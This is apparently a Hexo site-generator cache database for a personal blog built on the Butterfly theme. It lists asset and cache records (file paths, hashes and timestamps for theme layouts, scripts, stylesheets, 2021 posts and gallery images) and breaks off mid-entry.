{"meta":{"version":1,"warehouse":"4.0.0"},"models":{"Asset":[{"_id":"themes/butterfly/source/css/index.styl","path":"css/index.styl","modified":0,"renderable":1},{"_id":"themes/butterfly/source/css/var.styl","path":"css/var.styl","modified":0,"renderable":1},{"_id":"themes/butterfly/source/img/404.jpg","path":"img/404.jpg","modified":0,"renderable":1},{"_id":"themes/butterfly/source/img/algolia.svg","path":"img/algolia.svg","modified":0,"renderable":1},{"_id":"themes/butterfly/source/img/favicon.png","path":"img/favicon.png","modified":0,"renderable":1},{"_id":"themes/butterfly/source/img/friend_404.gif","path":"img/friend_404.gif","modified":0,"renderable":1},{"_id":"themes/butterfly/source/js/main.js","path":"js/main.js","modified":0,"renderable":1},{"_id":"themes/butterfly/source/js/tw_cn.js","path":"js/tw_cn.js","modified":0,"renderable":1},{"_id":"themes/butterfly/source/js/utils.js","path":"js/utils.js","modified":0,"renderable":1},{"_id":"themes/butterfly/source/js/search/algolia.js","path":"js/search/algolia.js","modified":0,"renderable":1},{"_id":"themes/butterfly/source/js/search/local-search.js","path":"js/search/local-search.js","modified":0,"renderable":1},{"_id":"source/Gallery/blog-img/2021-12-04/0.png","path":"Gallery/blog-img/2021-12-04/0.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/1.png","path":"Gallery/blog-img/2021-12-04/1.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/10.png","path":"Gallery/blog-img/2021-12-04/10.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/11.png","path":"Gallery/blog-img/2021-12-04/11.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/12.png","path":"Gallery/blog-img/2021-12-04/12.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/13.png","path":"Gallery/blog-img/2021-12-04/13.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/14.png","path":"Gallery/blog-img/2021-12-04/14.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/15.png","path":"Gallery/blog-img/2021-12-04/15.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/16.png","path":"Gallery/blog-img/2021-12-04/16.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/17.png","path":"Gallery/blog-img/2021-12-04/17.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/18.png","path":"Gallery/blog-img/2021-12-04/18.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/19.png","path":"Gallery/blog-img/2021-12-04/19.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/2.png","path":"Gallery/blog-img/2021-12-04/2.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/20.png","path":"Gallery/blog-img/2021-12-04/20.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/21.png","path":"Gallery/blog-img/2021-12-04/21.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/22.png","path":"Gallery/blog-img/2021-12-04/22.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/23.png","path":"Gallery/blog-img/2021-12-04/23.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/24.png","path":"Gallery/blog-img/2021-12-04/24.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/25.png","path":"Gallery/blog-img/2021-12-04/25.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/26.png","path":"Gallery/blog-img/2021-12-04/26.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/27.png","path":"Gallery/blog-img/2021-12-04/27.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/28.png","path":"Gallery/blog-img/2021-12-04/28.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/29.png","path":"Gallery/blog-img/2021-12-04/29.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/3.png","path":"Gallery/blog-img/2021-12-04/3.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/30.png","path":"Gallery/blog-img/2021-12-04/30.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/31.png","path":"Gallery/blog-img/2021-12-04/31.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/32.png","path":"Gallery/blog-img/2021-12-04/32.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/33.jpg","path":"Gallery/blog-img/2021-12-04/33.jpg","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/34.png","path":"Gallery/blog-img/2021-12-04/34.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/35.png","path":"Gallery/blog-img/2021-12-04/35.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/36.png","path":"Gallery/blog-img/2021-12-04/36.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/37.png","path":"Gallery/blog-img/2021-12-04/37.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/38.png","path":"Gallery/blog-img/2021-12-04/38.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/39.png","path":"Gallery/blog-img/2021-12-04/39.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/4.png","path":"Gallery/blog-img/2021-12-04/4.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/40.png","path":"Gallery/blog-img/2021-12-04/40.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/5.png","path":"Gallery/blog-img/2021-12-04/5.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/6.png","path":"Gallery/blog-img/2021-12-04/6.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/8.png","path":"Gallery/blog-img/2021-12-04/8.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/7.png","path":"Gallery/blog-img/2021-12-04/7.png","modified":0,"renderable":0},{"_id":"source/Gallery/blog-img/2021-12-04/9.png","path":"Gallery/blog-img/2021-12-04/9.png","modified":0,"renderable":0},{"_id":"source/Gallery/cover/data/0.jpg","path":"Gallery/cover/data/0.jpg","modified":0,"renderable":0},{"_id":"source/Gallery/cover/data/1.jpg","path":"Gallery/cover/data/1.jpg","modified":0,"renderable":0},{"_id":"source/Gallery/cover/data/10.jpg","path":"Gallery/cover/data/10.jpg","modified":0,"renderable":0},{"_id":"source/Gallery/cover/data/11.jpg","path":"Gallery/cover/data/11.jpg","modified":0,"renderable":0},{"_id":"source/Gallery/cover/data/12.jpg","path":"Gallery/cover/data/12.jpg","modified":0,"renderable":0},{"_id":"source/Gallery/cover/data/13.jpg","path":"Gallery/cover/data/13.jpg","modified":0,"renderable":0},{"_id":"source/Gallery/cover/data/14.jpg","path":"Gallery/cover/data/14.jpg","modified":0,"renderable":0},{"_id":"source/Gallery/cover/data/15.jpg","path":"Gallery/cover/data/15.jpg","modified":0,"renderable":0},{"_id":"source/Gallery/cover/data/2.jpg","path":"Gallery/cover/data/2.jpg","modified":0,"renderable":0},{"_id":"source/Gallery/cover/data/3.jpg","path":"Gallery/cover/data/3.jpg","modified":0,"renderable":0},{"_id":"source/Gallery/cover/data/4.jpg","path":"Gallery/cover/data/4.jpg","modified":0,"renderable":0},{"_id":"source/Gallery/cover/data/5.jpg","path":"Gallery/cover/data/5.jpg","modified":0,"renderable":0},{"_id":"source/Gallery/cover/data/6.jpg","path":"Gallery/cover/data/6.jpg","modified":0,"renderable":0},{"_id":"source/Gallery/cover/data/7.jpg","path":"Gallery/cover/data/7.jpg","modified":0,"renderable":0},{"_id":"source/Gallery/cover/data/8.jpg","path":"Gallery/cover/data/8.jpg","modified":0,"renderable":0},{"_id":"source/Gallery/cover/data/9.jpg","path":"Gallery/cover/data/9.jpg","modified":0,"renderable":0}],"Cache":[{"_id":"source/.DS_Store","hash":"754ed4b09fca0e38c031e381ef83221de85f800b","modified":1642061077538},{"_id":"source/Gallery/.DS_Store","hash":"03bdaf73fcf1e349ef15f54d1bd441f42b4c09aa","modified":1642127996622},{"_id":"source/Gallery/index.md","hash":"7129a419667cec6dd3b122ec6d1172d118c62072","modified":1642127070472},{"_id":"source/_data/link.yml","hash":"d04b11b763230b8a0130433cd4c452a123997112","modified":1642061077549},{"_id":"source/_posts/2021-02-24.md","hash":"a2347cd121d81173c1e5df6a4d9156c40c8d1258","modified":1642061077545},{"_id":"source/_posts/2021-10-09.md","hash":"24eb5283c8abdce34472241df8e33f09bc54af57","modified":1642061077544},{"_id":"source/_posts/2021-12-04.md","hash":"735f14c3c21eb750575b0a97ba0b892106d40c5d","modified":1642061077541},{"_id":"source/_posts/2021-12-05.md","hash":"4c57b5ff15fb44b50793cdd16c73b10130857715","modified":1642061077541},{"_id":"source/_posts/2021-12-10.md","hash":"114d265a82055eae809e3bbb34183c499d296c99","modified":1642061077542},{"_id":"source/_posts/2021-12-13.md","hash":"51266caee331d5eab95147fa76c91a6492bcc8a9","modified":1642061077544},{"_id":"source/_posts/2021-12-19.md","hash":"545eb6cbc2992c4adf7bc5612fb04c91000beaae","modified":1642061077545},{"_id":"source/_posts/2021-9-1.md","hash":"cd0e4e8ae8bc8ded4b17df52faabb8fd032bb246","modified":1642061077543},{"_id":"source/_posts/hello-world.md","hash":"7d98d6592de80fdcd2949bd7401cec12afd98cdf","modified":1642061077540},{"_id":"source/categories/index.md","hash":"e93ac5812ac103015d077290f5820351627636bb","modified":1642061077551},{"_id":"source/link/index.md","hash":"a54583172fa2d0b279beba57dd88e2dca9b288a2","modified":1642061077548},{"_id":"source/tags/index.md","hash":"e886112237aad30a85b91117baa02bcccabd5733","modified":1642061077547},{"_id":"source/Gallery/cover/index.md","hash":"be3304ef3d8fbdba22df8150028c863b92ca1724","modified":1642128412701},{"_id":"source/Gallery/blog-img/.DS_Store","hash":"50776f1f23ee7fc362c6b8cd89c36741bcb227c7","modified":1642127996621},{"_id":"source/Gallery/blog-img/2021-12-04/.DS_Store","hash":"df2fbeb1400acda0909a32c1cf6bf492f1121e07","modified":1642128009523},{"_id":"source/Gallery/blog-img/2021-12-04/13.png","hash":"ccc97c56c6f79c01f6063e0e753e35b8aa3e482f","modified":1638537413000},{"_id":"source/Gallery/blog-img/2021-12-04/16.png","hash":"2a0a853b248dac9b93e3b8557aea30c23f26bdc6","modified":1638537404000},{"_id":"source/Gallery/blog-img/2021-12-04/18.png","hash":"86e6c6205bd4c60bda01e8de67bb99f3d8035ad8","modified":1638537412000},{"_id":"source/Gallery/blog-img/2021-12-04/11.png","hash":"0a410bc49422d8c717d98a64a768e8f729ac6af6","modified":1638537393000},{"_id":"source/Gallery/blog-img/2021-12-04/12.png","hash":"14eddb47ced2e0c7cefb78d02a42dea5b5744323","modified":1638537397000},{"_id":"source/Gallery/blog-img/2021-12-04/17.png","hash":"9750d447f1902c09c2780ac6b8df419dbbe95f5c","modified":1638537406000},{"_id":"source/Gallery/blog-img/2021-12-04/24.png","hash":"53d77107e822c6a6779bb0a7bf53f693c7f467a5","modified":1638537424000},{"_id":"source/Gallery/blog-img/2021-12-04/23.png","hash":"90d43ee41ef06db517108b437ce81db7f4239948","modified":1638537421000},{"_id":"source/Gallery/blog-img/2021-12-04/26.png","hash":"ce683331eb395b20facb8044bd26f4061bfef2cb","modified":1638537425000},{"_id":"source/Gallery/blog-img/2021-12-04/27.png","hash":"0c7e23a7d66db7574e2e66b8ec7687aecdd624b7","modified":1638537427000},{"_id":"source/Gallery/blog-img/2021-12-04/29.png","hash":"2abfe9427d048beb8ea573519d4fbabfacf9986b","modified":1638537429000},{"_id":"source/Gallery/blog-img/2021-12-04/30.png","hash":"edc41b62b2fa7065d5444c8d4e32f8e815741669","modified":1638537431000},{"_id":"source/Gallery/blog-img/2021-12-04/25.png","hash":"4106e91709c3a7e41f0a38079ea99dd1a5bc9469","modified":1638537424000},{"_id":"source/Gallery/blog-img/2021-12-04/28.png","hash":"d5b3c06f533f36bcad683448a31c2e0e05b48fca","modified":1638537429000},{"_id":"source/Gallery/blog-img/2021-12-04/32.png","hash":"d252b102c4c87515b3285c10669654824ced4844","modified":1638537433000},{"_id":"source/Gallery/blog-img/2021-12-04/35.png","hash":"c0713d1e1bf8077db898d3928fa32f6435200b06","modified":1638537439000},{"_id":"source/Gallery/blog-img/2021-12-04/36.png","hash":"e7e2a01eaf94bd389297d17ebfa794929e3921a1","modified":1638537438000},{"_id":"source/Gallery/blog-img/2021-12-04/37.png","hash":"49fb7c2bb385bbc0a7549a815b213d456d434836","modified":1638537442000},{"_id":"source/Gallery/blog-img/2021-12-04/38.png","hash":"4335c3d61cd40134733f4dee6db069582dad9894","modified":1638537441000},{"_id":"source/Gallery/blog-img/2021-12-04/39.png","hash":"c723dc7c8b3fbabe747bf8bfd661a5307eee198e","modified":1638537443000},{"_id":"source/Gallery/blog-img/2021-12-04/4.png","hash":"68c04c5aff44c70dd9ee9a338a2d1d6442652f85","modified":1638537382000},{"_id":"source/Gallery/blog-img/2021-12-04/40.png","hash":"1b30305f56755c9deff793908ff348964d26b85c","modified":1638537444000},{"_id":"source/Gallery/blog-img/2021-12-04/5.png","hash":"e506f06125cf7ef65dff8c3a35ace58adafc6883","modified":1638537384000},{"_id":"source/Gallery/blog-img/2021-12-04/6.png","hash":"069590fc7cac0fa97e7cf2a48a412889a6dd90de","modified":1638537386000},{"_id":"source/Gallery/blog-img/2021-12-04/8.png","hash":"2175027ef37c83fad5876bebcc26576b4279852e","modified":1638537390000},{"_id":"source/Gallery/blog-img/2021-12-04/10.png","hash":"e96c484fe63457c9fd484189f95321ecef4288d8","modified":1638537394000},{"_id":"source/Gallery/blog-img/2021-12-04/14.png","hash":"431dedb8cd9642a3a3fb69d36490f026c90f63ba","modified":1638537400000},{"_id":"source/Gallery/blog-img/2021-12-04/15.png","hash":"5aac71a08154a131976456f67ef227f965d4ff0c","modified":1638537402000},{"_id":"source/Gallery/blog-img/2021-12-04/31.png","hash":"2f8a9ddde681134cd1cfb1d44f747615c2413515","modified":1638537432000},{"_id":"source/Gallery/blog-img/2021-12-04/34.png","hash":"a7302df99e9103068f84915dbad33970cbb6933f","modified":1638537437000},{"_id":"source/Gallery/blog-img/2021-12-04/1.png","hash":"e6b8c8010e7f2ad7326057d17aef406a640efbc2","modified":1638537386000},{"_id":"source/Gallery/blog-img/2021-12-04/19.png","hash":"997501eed8d9af52aab4b4e04ae0d1a2e25100c3","modified":1638537416000},{"_id":"source/Gallery/blog-img/2021-12-04/2.png","hash":"50a0cf26f712ee03491b8aa672e56dc372ae8921","modified":1638537375000},{"_id":"source/Gallery/blog-img/2021-12-04/3.png","hash":"a32959f7ca068c9497da754fbd701bbc2d733721","modified":1638537381000},{"_id":"source/Gallery/blog-img/2021-12-04/22.png","hash":"adb4bd58aee50a6529fa65a7cc870890a01151b3","modified":1638537421000},{"_id":"source/Gallery/blog-img/2021-12-04/20.png","hash":"2276ca94b459cad57fa5dabdef58d600b4aad5ea","modified":1638537417000},{"_id":"source/Gallery/blog-img/2021-12-04/21.png","hash":"72af00e9a2403c29355b6aae47bd03315bcc0f0a","modified":1638537419000},{"_id":"source/Gallery/blog-img/2021-12-04/7.png","hash":"a8fc2f79be570e9fd4b7b7c4aaefeca5132e97f4","modified":1638537389000},{"_id":"source/Gallery/blog-img/2021-12-04/9.png","hash":"671a5c9c5dea2159502fd45ab9c18919d564c7d9","modified":1638537392000},{"_id":"source/Gallery/blog-img/2021-12-04/33.jpg","hash":"4d40ca5c57e13950cf81d5c54aea732a31745266","modified":1638602163000},{"_id":"themes/butterfly/README.md","hash":"cedd13fcd8c75a68742265dd8eced4087e940ffd","modified":1642061082628},{"_id":"themes/butterfly/README_CN.md","hash":"459d6f3200863021bee1fe72a719aef236fb4090","modified":1642061082628},{"_id":"themes/butterfly/LICENSE","hash":"1128f8f91104ba9ef98d37eea6523a888dcfa5de","modified":1642061082523},{"_id":"themes/butterfly/package.json","hash":"333603963b3d2cedb643def8a9955f6d540f5d95","modified":1642061082629},{"_id":"themes/butterfly/languages/default.yml","hash":"7ca673fb629ea74f5ba5e75b4f0f95248cfb5090","modified":1642061082626},{"_id":"themes/butterfly/languages/en.yml","hash":"cd333235ff1648a6bf58dfafc81f2c57672a15a5","modified":1642061082626},{"_id":"themes/butterfly/languages/zh-CN.yml","hash":"741e522b2387f94764a73844e7b084cc7e927c54","modified":1642061082627},{"_id":"themes/butterfly/_config.yml","hash":"63d1a594969b7b5b97e1babebc7b85ef07c02e4f","modified":1642061082629},{"_id":"themes/butterfly/languages/zh-TW.yml","hash":"79a50c40d9f5463f1fa42aa870ac6b8b84540412","modified":1642061082627},{"_id":"themes/butterfly/layout/archive.pug","hash":"bd62286afb64a51c97e800c5945620d51605d5fa","modified":1642061082524},{"_id":"themes/butterfly/layout/category.pug","hash":"60c1b795b6e227b5dd81963b51d29d1b81d0bf49","modified":1642061082525},{"_id":"themes/butterfly/layout/index.pug","hash":"e1c3146834c16e6077406180858add0a8183875a","modified":1642061082525},{"_id":"themes/butterfly/layout/post.pug","hash":"8d398c8925182699d9f2b9f1b727f06228488312","modified":1642061082525},{"_id":"themes/butterfly/layout/page.pug","hash":"82aa988527a11835e7ac86ce4f23b8cd20014dfa","modified":1642061082590},{"_id":"themes/butterfly/source/.DS_Store","hash":"327c1578d2dce183e9614a863493929e6969c503","modified":1642126467524},{"_id":"themes/butterfly/layout/tag.pug","hash":"0440f42569df2676273c026a92384fa7729bc4e9","modified":1642061082589},{"_id":"themes/butterfly/layout/includes/404.pug","hash":"7d378e328a53cc99d5acc9682dce53f5eb61537d","modified":1642061082542},{"_id":"themes/butterfly/layout/includes/additional-js.pug","hash":"4156224c47bfc2482281ac4e4df701c30476ff00","modified":1642061082544},{"_id":"themes/butterfly/layout/includes/footer.pug","hash":"02390a5b6ae1f57497b22ba2e6be9f13cfb7acac","modified":1642061082552},{"_id":"themes/butterfly/layout/includes/head.pug","hash":"1377952022ee0a9eaa7a2fd1098f1571efc468d9","modified":1642061082544},{"_id":"themes/butterfly/layout/includes/layout.pug","hash":"6f2608c4d93d3d10ae6b2cd7f8918f303f024321","modified":1642061082553},{"_id":"themes/butterfly/layout/includes/pagination.pug","hash":"0b80f04950bd0fe5e6c4e7b7559adf4d0ce28436","modified":1642061082529},{"_id":"themes/butterfly/scripts/events/404.js","hash":"83cd7f73225ccad123afbd526ce1834eb1eb6a6d","modified":1642061082635},{"_id":"themes/butterfly/scripts/events/init.js","hash":"018aa446265fe627301b1d53d7cba4f4ff1960ac","modified":1642061082635},{"_id":"themes/butterfly/layout/includes/sidebar.pug","hash":"8dafc2dcd8c33f70a546fee443f0b6d80b3cd243","modified":1642061082586},{"_id":"themes/butterfly/layout/includes/rightside.pug","hash":"2d0453adf92a3fd3466cf0793f14685d17b8b51d","modified":1642061082543},{"_id":"themes/butterfly/scripts/events/welcome.js","hash":"d575137c8779e50422c2416f4d0832fdea346ee6","modified":1642061082635},{"_id":"themes/butterfly/scripts/filters/random_cover.js","hash":"9821872007cf57efae4b728dc575ef9d004547bb","modified":1642061082631},{"_id":"themes/butterfly/scripts/filters/post_lazyload.js","hash":"4cc2d517195c8779471d326ada09f9371cbad4dd","modified":1642061082631},{"_id":"themes/butterfly/scripts/helpers/aside_archives.js","hash":"2ec66513d5322f185d2071acc052978ba9415a8e","modified":1642061082643},{"_id":"themes/butterfly/scripts/helpers/aside_categories.js","hash":"e00efdb5d02bc5c6eb4159e498af69fa61a7dbb9","modified":1642061082643},{"_id":"themes/butterfly/scripts/helpers/page.js","hash":"c6611d97087c51845cb1ab4821696a62fa33daeb","modified":1642061082642},{"_id":"themes/butterfly/scripts/helpers/inject_head_js.js","hash":"65f2442e04c4defd16e7c1e67701d3bb41d9577a","modified":1642061082644},{"_id":"themes/butterfly/scripts/helpers/related_post.js","hash":"21556f9cb412ddc500ad12ecfd419f3ea6c9f663","modified":1642061082642},{"_id":"themes/butterfly/scripts/tag/button.js","hash":"b816ded1451f28c7c54151ffe6c259b110253ae3","modified":1642061082639},{"_id":"themes/butterfly/scripts/tag/inlineImg.js","hash":"a43ee2c7871bdd93cb6beb804429e404570f7929","modified":1642061082637},{"_id":"themes/butterfly/scripts/tag/label.js","hash":"03b2afef41d02bd1045c89578a02402c28356006","modified":1642061082641},{"_id":"themes/butterfly/scripts/tag/hide.js","hash":"f33858ffb9e88191e644796e11d2f901eb332308","modified":1642061082640},{"_id":"themes/butterfly/scripts/tag/gallery.js","hash":"94826ea6bcc4d2304199adae12c4e2b272caf529","modified":1642061082638},{"_id":"themes/butterfly/scripts/tag/tabs.js","hash":"6c6e415623d0fd39da016d9e353bb4f5cca444f5","modified":1642061082638},{"_id":"themes/butterfly/scripts/tag/note.js","hash":"c16c6eb058af2b36bcd583b2591076c7ebdd51ad","modified":1642061082638},{"_id":"themes/butterfly/scripts/tag/mermaid.js","hash":"35f073021db93699fcac9ef351e26c59c31aadf7","modified":1642061082637},{"_id":"themes/butterfly/source/css/index.styl","hash":"861998e4ac67a59529a8245a9130d68f826c9c12","modified":1642061082602},{"_id":"themes/butterfly/source/css/var.styl","hash":"40c3f64422205a24e68ce1ad8fe8163f24fdd525","modified":1642061082597},{"_id":"themes/butterfly/source/img/.DS_Store","hash":"df2fbeb1400acda0909a32c1cf6bf492f1121e07","modified":1642126461833},{"_id":"themes/butterfly/source/img/404.jpg","hash":"fb4489bc1d30c93d28f7332158c1c6c1416148de","modified":1642061082624},{"_id":"themes/butterfly/source/img/algolia.svg","hash":"ec119560b382b2624e00144ae01c137186e91621","modified":1642061082624},{"_id":"themes/butterfly/source/img/friend_404.gif","hash":"8d2d0ebef70a8eb07329f57e645889b0e420fa48","modified":1642061082625},{"_id":"themes/butterfly/source/js/main.js","hash":"b244f28124a46d7f1e8ef76ba6e925289691f93b","modified":1642061082621},{"_id":"themes/butterfly/source/js/tw_cn.js","hash":"00053ce73210274b3679f42607edef1206eebc68","modified":1642061082622},{"_id":"themes/butterfly/source/js/utils.js","hash":"8319b59c26ce8cd2b0ae7d030c4912215148fa92","modified":1642061082622},{"_id":"themes/butterfly/layout/includes/head/Open_Graph.pug","hash":"6c41f49a3e682067533dd9384e6e4511fc3a1349","modified":1642061082545},{"_id":"themes/butterfly/layout/includes/head/analytics.pug","hash":"90d01b88d0f406d00184960b1afe9230aec2ebe6","modified":1642061082547},{"_id":"themes/butterfly/layout/includes/head/config.pug","hash":"4def0aab9e2172ad1f29abd1535d8e08ff23aa0b","modified":1642061082546},{"_id":"themes/butterfly/layout/includes/head/config_site.pug","hash":"889ef16fa34a39e5533bc170e62f20f3450cc522","modified":1642061082548},{"_id":"themes/butterfly/layout/includes/head/google_adsense.pug","hash":"95a37e92b39c44bcbea4be7e29ddb3921c5b8220","modified":1642061082551},{"_id":"themes/butterfly/layout/includes/head/noscript.pug","hash":"d16ad2ee0ff5751fd7f8a5ce1b83935518674977","modified":1642061082548},{"_id":"themes/butterfly/layout/includes/head/preconnect.pug","hash":"e55f8bdb876d5429a908498db1307b94094c0d06","modified":1642061082547},{"_id":"themes/butterfly/layout/includes/head/pwa.pug","hash":"3d492cfe645d37c94d30512e0b230b0a09913148","modified":1642061082546},{"_id":"themes/butterfly/layout/includes/head/site_verification.pug","hash":"e2e8d681f183f00ce5ee239c42d2e36b3744daad","modified":1642061082552},{"_id":"themes/butterfly/layout/includes/header/index.pug","hash":"65fa23680af0daf64930a399c2f2ca37809a8149","modified":1642061082588},{"_id":"themes/butterfly/layout/includes/header/menu_item.pug","hash":"24370508ee87f14418e8f06e9d79ad8c52a342c4","modified":1642061082588},{"_id":"themes/butterfly/layout/includes/header/nav.pug","hash":"c205b9fd72b2fe19e6d15c5b5ab0fb38c653032e","modified":1642061082587},{"_id":"themes/butterfly/layout/includes/loading/loading-js.pug","hash":"4cfcf0100e37ce91864703cd44f1cb99cb5493ea","modified":1642061082531},{"_id":"themes/butterfly/layout/includes/header/social.pug","hash":"0d953e51d04a9294a64153c89c20f491a9ec42d4","modified":1642061082589},{"_id":"themes/butterfly/layout/includes/header/post-info.pug","hash":"92f81a437c9db49f7ebcf608bc09488ecdb55a21","modified":1642061082589},{"_id":"themes/butterfly/layout/includes/loading/loading.pug","hash":"5276937fbcceb9d62879dc47be880cd469a27349","modified":1642061082535},{"_id":"themes/butterfly/layout/includes/mixins/post-ui.pug","hash":"4c3c5cb69b3aead8c232cb0fbc251929f28aad75","modified":1642061082543},{"_id":"themes/butterfly/layout/includes/mixins/article-sort.pug","hash":"2fb74d0b0e4b98749427c5a1a1b0acb6c85fadc4","modified":1642061082543},{"_id":"themes/butterfly/layout/includes/page/categories.pug","hash":"1f30952fed73dec21b42e2e30b7fe2e84618d2e4","modified":1642061082528},{"_id":"themes/butterfly/layout/includes/page/default-page.pug","hash":"dbec869c62135695495703a29ad7655e9965d461","modified":1642061082528},{"_id":"themes/butterfly/layout/includes/page/tags.pug","hash":"93d4ebc7dc8228c7a10ddeb5a553d0dcdabbe145","modified":1642061082528},{"_id":"themes/butterfly/layout/includes/post/post-copyright.pug","hash":"88e3b611b03149665e4113cfa39595c1a3fca7e5","modified":1642061082530},{"_id":"themes/butterfly/layout/includes/page/flink.pug","hash":"b53a2d4f9c37b375a4446d2273dcfb7712d91b3e","modified":1642061082527},{"_id":"themes/butterfly/layout/includes/post/reward.pug","hash":"5b404356f311d2ee36478291ca3553210867b738","modified":1642061082530},{"_id":"themes/butterfly/layout/includes/third-party/aplayer.pug","hash":"292646dfab135973b09f0fa9e3931e83da2ed30e","modified":1642061082560},{"_id":"themes/butterfly/layout/includes/third-party/pangu.pug","hash":"d5fec7dedc52ab23865fb4db002755e9bdaadc9f","modified":1642061082575},{"_id":"themes/butterfly/layout/includes/third-party/pjax.pug","hash":"933cb710d2dbcea25c6426a57c6f49d2f48b792c","modified":1642061082579},{"_id":"themes/butterfly/layout/includes/third-party/prismjs.pug","hash":"1fbecfd299068f90d727f0c8c65e2a792fa6e3e2","modified":1642061082575},{"_id":"themes/butterfly/layout/includes/third-party/effect.pug","hash":"b9d54a01d7c2a7a183cb7209e99430ce7fea1fe3","modified":1642061082564},{"_id":"themes/butterfly/layout/includes/widget/card_ad.pug","hash":"60dc48a7b5d89c2a49123c3fc5893ab9c57dd225","modified":1642061082539},{"_id":"themes/butterfly/layout/includes/third-party/subtitle.pug","hash":"d50e5c22cd6bc3c378bc581918136746cfa3447f","modified":1642061082563},{"_id":"themes/butterfly/layout/includes/widget/card_announcement.pug","hash":"3d8e3706a056389176f55dd21956aabc78046761","modified":1642061082537},{"_id":"themes/butterfly/layout/includes/widget/card_archives.pug","hash":"86897010fe71503e239887fd8f6a4f5851737be9","modified":1642061082538},{"_id":"themes/butterfly/layout/includes/widget/card_author.pug","hash":"0366c658cdcff839aa1df2e2d252a03a53fd427e","modified":1642061082540},{"_id":"themes/butterfly/layout/includes/widget/card_bottom_self.pug","hash":"13dc8ce922e2e2332fe6ad5856ebb5dbf9ea4444","modified":1642061082537},{"_id":"themes/butterfly/layout/includes/widget/card_categories.pug","hash":"d1a416d0a8a7916d0b1a41d73adc66f8c811e493","modified":1642061082541},{"_id":"themes/butterfly/layout/includes/widget/card_newest_comment.pug","hash":"27afd2274bd5f2cbbf1bad9f0afe2b2b72c213ca","modified":1642061082540},{"_id":"themes/butterfly/layout/includes/widget/card_post_toc.pug","hash":"ae9336bf31cdad08ff586ead4295912a96563c76","modified":1642061082536},{"_id":"themes/butterfly/layout/includes/widget/card_recent_post.pug","hash":"9c1229af6ab48961021886882c473514101fba21","modified":1642061082536},{"_id":"themes/butterfly/layout/includes/widget/card_tags.pug","hash":"438aea3e713ed16b7559b9a80a9c5ec0221263df","modified":1642061082539},{"_id":"themes/butterfly/layout/includes/widget/index.pug","hash":"b5525891f6affd02c1ea3b2327c026882efe428b","modified":1642061082537},{"_id":"themes/butterfly/layout/includes/widget/card_webinfo.pug","hash":"0612aaee878f33ea8d3da0293c7dc3b6cd871466","modified":1642061082538},{"_id":"themes/butterfly/layout/includes/widget/card_top_self.pug","hash":"ae67c6d4130a6c075058a9c1faea1648bcc6f83e","modified":1642061082541},{"_id":"themes/butterfly/source/css/_global/function.styl","hash":"eda47f3e807a466ba8275627ea936c5100c43818","modified":1642061082597},{"_id":"themes/butterfly/source/css/_global/index.styl","hash":"e211efbd1952d4b1b881287aa43423133c1d166e","modified":1642061082596},{"_id":"themes/butterfly/source/css/_highlight/highlight.styl","hash":"85e72c70a0cef29e40be1968f5d23b06c6f8e3aa","modified":1642061082615},{"_id":"themes/butterfly/source/css/_highlight/theme.styl","hash":"fa4b87e7b29bdd1f09eb1a30e06ba74b224f0ba2","modified":1642061082617},{"_id":"themes/butterfly/source/css/_layout/aside.styl","hash":"7feb755ca7c22da36bbad11e74ecd95fdcf3b879","modified":1642061082606},{"_id":"themes/butterfly/source/css/_layout/chat.styl","hash":"29f48f9370f245e6e575b5836bccf47eb5688d8b","modified":1642061082606},{"_id":"themes/butterfly/source/css/_layout/comments.styl","hash":"f1b63892baafa48ab872bc79671d57aafd511f6c","modified":1642061082604},{"_id":"themes/butterfly/source/css/_layout/footer.styl","hash":"dd8cdf639ba2b726437c77fa7aa8d5edbabe8f9b","modified":1642061082605},{"_id":"themes/butterfly/source/css/_layout/pagination.styl","hash":"90fe01c968696a9f791cb2b84fca621cbbb56f47","modified":1642061082603},{"_id":"themes/butterfly/source/css/_layout/loading.styl","hash":"7d18a7b